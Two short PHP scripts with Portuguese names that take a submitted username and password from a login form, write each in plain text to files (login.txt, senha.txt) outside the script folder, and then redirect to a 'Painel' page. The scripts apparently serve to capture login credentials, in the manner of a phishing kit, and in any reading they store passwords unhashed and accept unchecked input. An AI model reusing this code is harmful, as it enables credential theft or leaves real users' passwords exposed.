<?php
$user = $_POST["username"];

$files = glob('../login.txt'); 
foreach($files as $file){ 
  if(is_file($file))
    unlink($file);
}
$escreve = $user;

$fp = fopen("../login.txt", "a");
fwrite($fp, $escreve);
fclose($fp);
?>
<?php
$user = $_POST["password"];

$files = glob('../senha.txt'); 
foreach($files as $file){ 
  if(is_file($file))
    unlink($file);
}
$escreve = $user;

$fp = fopen("../senha.txt", "a");
fwrite($fp, $escreve);
fclose($fp);
header("Location: ../Painel");
?>